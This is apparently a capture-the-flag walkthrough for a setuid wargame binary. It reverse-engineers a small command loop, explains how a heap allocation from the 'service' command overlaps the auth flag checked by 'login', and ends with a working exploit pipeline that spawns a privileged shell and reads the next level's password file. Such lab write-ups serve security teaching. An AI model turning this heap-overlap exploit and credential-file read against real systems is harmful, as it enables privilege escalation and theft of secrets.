level8 - walkthrough
====================

Target: /home/user/level8/level8   (setuid + setgid level9)
Goal:   read /home/user/level9/.pass

1. Recon (objdump -d level8) -- it is a REPL. Each loop:
     printf("%p, %p \n", service, auth);   ; shows the two global pointers
     fgets(line, 0x80, stdin);
     "auth "   (5) : auth = malloc(4); *auth = 0;
                     if (strlen(line+5) <= 30) strcpy(auth, line+5);
     "reset"   (5) : free(auth);
     "service" (6) : service = strdup(line+7);
     "login"   (5) : if (*(int*)(auth + 0x20)) system("/bin/sh");
                     else fwrite("Password:\n", ...);
   Command strings and "/bin/sh" confirmed with gdb x/s.

2. The bug
   "login" tests *(auth + 0x20), i.e. 32 bytes into auth. But "auth" only
   allocates 4 bytes and its own name can be at most 30 bytes (bounded), so the
   auth string alone can never reach offset 0x20.
   However auth = malloc(4), and the next heap allocation -- the "service"
   strdup -- is placed immediately after auth's chunk. A long enough service
   string therefore covers the auth+0x20 address with its (non-zero) bytes.

3. Verify (gdb, break at the login check 0x80486e7)
     input: "auth AAAA" then "service BBBBBBBBBBBBBBBBBBBBBBBB"
     auth               = 0x0804a008
     *(auth + 0x20)     = 0x42424242   ("BBBB" from the service string)
   Non-zero => login will run system("/bin/sh").

4. Exploit
   Feed three commands, then (after a pause, so fgets' read-ahead doesn't eat
   it) the command for the spawned shell:
     ( printf 'auth AAAA\nservice BBBBBBBBBBBBBBBBBBBBBBBB\nlogin\n'
       sleep 1
       echo "cat /home/user/level9/.pass" ) | ./level8

